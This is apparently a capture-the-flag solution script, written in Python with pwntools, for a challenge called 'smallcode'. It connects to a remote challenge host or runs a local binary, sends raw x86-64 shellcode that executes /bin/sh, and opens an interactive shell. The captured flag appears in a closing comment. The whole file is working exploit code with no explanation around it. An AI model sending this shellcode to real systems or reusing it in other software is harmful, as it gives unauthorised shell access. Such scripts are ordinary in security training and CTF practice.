#!/usr/bin/env python3
import pwn
import vpn_conf
import sys

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 3)
EXE_FILENAME = "./smallcode"


def start():
    print(sys.argv)
    if sys.argv[1] == "remote":
        return pwn.remote(HOST, PORT)
    return pwn.process(EXE_FILENAME)


if __name__ == "__main__":
    io = start()
    shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05"
    io.send(shellcode)
    io.interactive()

# FLAG : BASC{0pT1miZin9_5h3llc0d3_iS_n0T_s0_H4rD}
